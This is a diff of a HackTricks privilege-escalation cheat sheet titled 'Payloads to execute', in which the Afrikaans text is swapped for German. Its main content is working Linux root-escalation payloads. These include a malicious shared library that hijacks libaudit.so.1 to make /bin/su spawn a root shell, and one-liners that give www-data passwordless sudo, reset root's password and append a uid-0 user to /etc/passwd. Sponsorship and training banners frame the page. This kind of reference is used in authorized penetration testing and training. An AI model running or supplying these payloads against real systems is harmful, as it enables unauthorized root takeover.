@@ -1,16 +1,16 @@
-# Payloads om uit te voer
+# Payloads to execute
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -57,18 +57,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Oorskrywing van 'n lêer om voorregte te verhoog
+## Überschreiben einer Datei zur Eskalation von Rechten
 
-### Algemene lêers
+### Häufige Dateien
 
-* Voeg gebruiker met wagwoord by _/etc/passwd_
-* Verander wagwoord binne _/etc/shadow_
-* Voeg gebruiker by sudoers in _/etc/sudoers_
-* Misbruik docker deur die docker socket, gewoonlik in _/run/docker.sock_ of _/var/run/docker.sock_
+* Benutzer mit Passwort zu _/etc/passwd_ hinzufügen
+* Passwort in _/etc/shadow_ ändern
+* Benutzer zu sudoers in _/etc/sudoers_ hinzufügen
+* Docker über den Docker-Socket missbrauchen, normalerweise in _/run/docker.sock_ oder _/var/run/docker.sock_
 
-### Oorskrywing van 'n biblioteek
+### Überschreiben einer Bibliothek
 
-Kontroleer 'n biblioteek wat deur 'n sekere binêre gebruik word, in hierdie geval `/bin/su`:
+Überprüfen Sie eine Bibliothek, die von einem bestimmten Binärprogramm verwendet wird, in diesem Fall `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -80,8 +80,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-In hierdie geval, kom ons probeer om `/lib/x86_64-linux-gnu/libaudit.so.1` na te volg.\
-So, kyk vir funksies van hierdie biblioteek wat deur die **`su`** binêre gebruik word:
+In diesem Fall versuchen wir, `/lib/x86_64-linux-gnu/libaudit.so.1` zu impersonifizieren.\
+Überprüfen Sie die Funktionen dieser Bibliothek, die von der **`su`**-Binärdatei verwendet werden:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -89,7 +89,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Die simbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` en `audit_fd` is waarskynlik van die libaudit.so.1 biblioteek. Aangesien die libaudit.so.1 deur die kwaadwillige gedeelde biblioteek oorgeskryf sal word, moet hierdie simbole in die nuwe gedeelde biblioteek teenwoordig wees, anders sal die program nie die simbool kan vind nie en sal dit afsluit.
+Die Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` und `audit_fd` stammen wahrscheinlich aus der Bibliothek libaudit.so.1. Da die libaudit.so.1 von der bösartigen Shared Library überschrieben wird, sollten diese Symbole in der neuen Shared Library vorhanden sein, andernfalls kann das Programm das Symbol nicht finden und wird beendet.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -111,35 +111,35 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Nou, net deur **`/bin/su`** aan te roep, sal jy 'n shell as root verkry.
+Jetzt, indem Sie einfach **`/bin/su`** aufrufen, erhalten Sie eine Shell als root.
 
 ## Skripte
 
-Kan jy root iets laat uitvoer?
+Können Sie root dazu bringen, etwas auszuführen?
 
-### **www-data na sudoers**
+### **www-data zu sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Verander wortel wagwoord**
+### **Root-Passwort ändern**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### Voeg nuwe root gebruiker by /etc/passwd
+### Neuen Root-Benutzer zu /etc/passwd hinzufügen
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.
 
 </details>
 {% endhint %}
